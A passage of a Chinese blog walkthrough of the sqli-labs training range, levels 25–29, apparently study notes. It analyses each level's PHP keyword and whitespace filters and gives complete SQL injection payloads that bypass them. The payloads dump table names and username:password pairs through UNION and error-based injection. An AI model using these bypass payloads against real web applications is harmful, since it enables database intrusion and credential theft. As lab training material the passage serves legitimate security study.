的get注入</p><h3 id="测试阶段"><a href="#测试阶段" class="headerlink" title="测试阶段"></a>测试阶段</h3><p><code>&#39;</code>报错 <code>&#39;&#39;</code>不报错 那么就是<code>&#39;</code>闭合</p><p>我们知道可以用<code>--+</code>注释掉后面</p><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-comment">--+</span></code></pre><p>语法不正确 发现过滤了 <code>or</code> </p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/03.png" alt="Less-25(过滤or和and)"></p><p>那么我们继续构造，3正常，4报错</p><pre><code class="hljs sql">?id=1&#x27; oorrder by 1 <span class="hljs-comment">--+</span>?id=1&#x27; oorrder by 2 <span class="hljs-comment">--+</span>?id=1&#x27; oorrder by 3 <span class="hljs-comment">--+</span>?id=1&#x27; oorrder by 4 <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/04.png" alt="Less-25(过滤or和and)"></p><h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><pre><code class="hljs sql">http://sqli.pl/Less-25/?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/05.png" alt="Less-25(过滤or和and)"></p><h3 id="爆破表名"><a href="#爆破表名" class="headerlink" title="爆破表名"></a>爆破表名</h3><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p>information 的or</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> infoorrmation_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/06.png" alt="Less-25(过滤or和and)"></p><p>爆破列名</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> infoorrmation_schema.columns  <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/07.png" alt="Less-25(过滤or和and)"></p><h3 id="爆破出数据"><a href="#爆破出数据" class="headerlink" title="爆破出数据"></a>爆破出数据</h3><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/08.png" alt="Less-25(过滤or和and)"></p><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>与 Less-25 相比，只是拼接方式改变，因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的，这里不再啰嗦。</p><pre><code class="hljs sql">?id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd+SEPARATOORR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-26-过滤or、and、-、注释、空格和斜线"><a href="#Less-26-过滤or、and、-、注释、空格和斜线" class="headerlink" title="Less-26(过滤or、and、/*、注释、空格和斜线)"></a>Less-26(过滤or、and、/*、注释、空格和斜线)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 过滤了 or 和 and 大小写</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//strip out OR (non case sensitive)</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/and/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out AND (non case sensitive)</span><span class="hljs-comment"># 过滤了 /*</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//strip out /*</span><span class="hljs-comment"># 过滤了 -- 和 # 注释</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out --</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);            <span class="hljs-comment">//Strip out #</span><span class="hljs-comment"># 过滤了空格</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\s]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out spaces</span><span class="hljs-comment"># 过滤了斜线</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);        <span class="hljs-comment">//Strip out slashes</span><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>过滤了 or 和 and 可以采用 双写或者 &amp;&amp; || 绕过</p><p>过滤注释 可以使用闭合绕过</p><p>过滤了空格 可以使用如下的符号来替代：</p><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>%09</td><td>TAB 键(水平)</td></tr><tr><td>%0a</td><td>新建一行</td></tr><tr><td>%0c</td><td>新的一页</td></tr><tr><td>%0d</td><td>return 功能</td></tr><tr><td>%0b</td><td>TAB 键(垂直)</td></tr><tr><td>%a0</td><td>空格</td></tr></tbody></table><p><strong>由于我在windows下无法使用一些特殊的字符代替空格，此处是因为apache的解析的问题。</strong></p><p>直接使用报错注入</p><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><p>（在hackbar中输入&amp;&amp;时，需要自行URL编码为%26%26，否则会报错，而输入||不需要）</p><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())),<span class="hljs-number">1</span>)%<span class="hljs-number">26</span>%<span class="hljs-number">26</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/09.png" alt="Less-25(过滤or和and)"></p><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/10.png" alt="Less-25(过滤or和and)"></p><p>but 好像不行，过滤了<code>空格</code>和<code>or</code></p><p>绕过</p><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/11.png" alt="Less-25(过滤or和and)"></p><h3 id="爆破列名"><a href="#爆破列名" class="headerlink" title="爆破列名"></a>爆破列名</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.columns)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>table_name=<span class="hljs-string">&#x27;users&#x27;</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/12.png" alt="Less-25(过滤or和and)"></p><h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><pre><code class="hljs sql">?id=1&#x27;||updatexml(1,concat(&#x27;:&#x27;,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><span class="hljs-string"></span><span class="hljs-string">?id=1&#x27;</span>||updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;:&#x27;</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)<span class="hljs-keyword">where</span>(username=<span class="hljs-string">&#x27;admin&#x27;</span>))),<span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/13.png" alt="Less-25(过滤or和and)"></p><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>与 Less-26 相比，只是拼接方式改变了，<code>因为没有输出报错信息，所以不能使用报错注入了</code>，只能被迫抛弃win环境使用docker，直接上payload。</p><pre><code class="hljs sql">?id=999&#x27;)%a0union%a0select%a01,database(),3||(&#x27;1&#x27;)=(&#x27;1?id=999&#x27;)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span><span class="hljs-string"></span><span class="hljs-string">?id=999&#x27;</span>)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.columns)<span class="hljs-keyword">where</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span><span class="hljs-string"></span><span class="hljs-string">?id=999&#x27;</span>)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-27-过滤了很多"><a href="#Less-27-过滤了很多" class="headerlink" title="Less-27(过滤了很多)"></a>Less-27(过滤了很多)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>查看代码，过滤规则又增加了许多：</p><pre><code class="hljs php"><span class="hljs-comment"># 过滤了 /*</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 -</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 #</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了空格</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 select /m 严格模式 不可以使用双写绕过</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/select/m&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/Select/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/SELECT/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤了 union UNION</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/Union/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/UNION/s&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><blockquote><p>PHP语法</p></blockquote><blockquote><p>正则表达式</p></blockquote><p><a href="http://php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers">PHP正则表达式的模式修饰符（官方文档）</a><br><a href="http://www.php.cn/php-weizijiaocheng-354831.html">PHP正则中的i,m,s,x,e</a></p><blockquote><ul><li><code>i</code><br>如果设定了此修正符，模式中的字符将同时匹配大小写字母。</li><li><code>m</code><br>如果设定了此修正符，行起始和行结束除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</li><li><code>s</code><br>如果设定了此修正符，模式中的圆点元字符<code>.</code>匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</li><li><code>x</code><br>如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的<code>#</code>以及下一个换行符之间的所有字符，包括两头，也都被忽略。</li><li><code>e</code><br>如果设定了此修正符，<code>preg_replace()</code>在替换字符串中对逆向引用作正常的替换。</li><li><code>?</code><br>在<code>.</code>/<code>+</code>/<code>*</code>之后表示非贪婪匹配，<code>.</code>/<code>+</code>/<code>*</code>限定符都是贪婪的，它们会尽可能多的匹配文字，在它们的后面加上一个<code>?</code>就可以实现非贪婪或最小匹配。</li></ul></blockquote><p>union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过。</p><pre><code class="hljs bash"><span class="hljs-comment"># 大小写混写</span>unioNunIonseLect...<span class="hljs-comment"># 嵌套双写</span>uunionnionsselectelectununionion...</code></pre><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>单引号字符型，过滤掉了#,–,空格等字符</p><pre><code class="hljs sql">?id=1&#x27;||&#x27;1&#x27;=&#x27;1</code></pre><p>成功闭合<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/14.png" alt="Less-27"></p><h3 id="判断数据库名"><a href="#判断数据库名" class="headerlink" title="判断数据库名"></a>判断数据库名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,database(),3%0a||&#x27;1&#x27;=&#x27;1<span class="hljs-comment">#使用%0a代替空格，unIon、selEct随机大小写绕过，-被过滤了，使用999让其爆出显错位</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/15.png" alt="Less-27"></p><h3 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/16.png" alt="Less-27"></p><h3 id="判断列名"><a href="#判断列名" class="headerlink" title="判断列名"></a>判断列名</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/17.png" alt="Less-27"></p><h3 id="得到数据"><a href="#得到数据" class="headerlink" title="得到数据"></a>得到数据</h3><pre><code class="hljs sql">?id=999&#x27;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/18.png" alt="Less-27"></p><blockquote><p>总结</p></blockquote><p>1 这里空格<code>%0a</code>代替</p><p>2这里正则表达式是只要你含有 就会一直匹配 双写不能绕过</p><p>3当-1不能用的时候 随便用一个错误的值把显示的位置让出来 给你要的数据</p><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-27 相比，只是拼接方式发生了改变，又因为没有报错日志的输出，所以少了报错注入的利用方式，利用方式换汤不换药，这里不做演示了。</p><pre><code class="hljs sql">?id=999&quot;%0aunIon%0aselEct%0a1,(<span class="hljs-keyword">selEct</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>%<span class="hljs-number">0</span>a||<span class="hljs-string">&quot;1&quot;</span>=<span class="hljs-string">&quot;1</span></code></pre><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>过滤规则如下：</p><pre><code class="hljs Php"><span class="hljs-comment"># 过滤 /*</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤 - # 注释</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment"># 过滤 空格 +</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);.<span class="hljs-comment"># 过滤 union select /i 大小写都过滤</span><span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>这里 union 和 select 这里可以使用双写嵌套绕过，过滤了注释的话 就使用闭合绕过，过滤了空格使用 Less-26 的编码绕过，OK分析完成后直接放完整的 payload 吧：</p><pre><code class="hljs sql">?id=999&#x27;)%a0union%a0select%a01,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span>%a0SEPARATOR%a00x3c62723e))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">3</span>||(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>比 Less-28 还少了几个过滤规则，可以直接使用 Less-28 的payload：</p><h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><p>这一题和注入天书里面描述的环境不太一样，还是具体分析看下代码吧。</p><ul><li><code>index.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># id = &#x27;x&#x27; 的拼接方式</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> 查询到结果:    输出查询的详细信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p>从源码来看的话和前面的貌似没有啥区别，直接尝试联合注入看看吧：</p><pre><code class="hljs sql">?id=-1&#x27; union <span 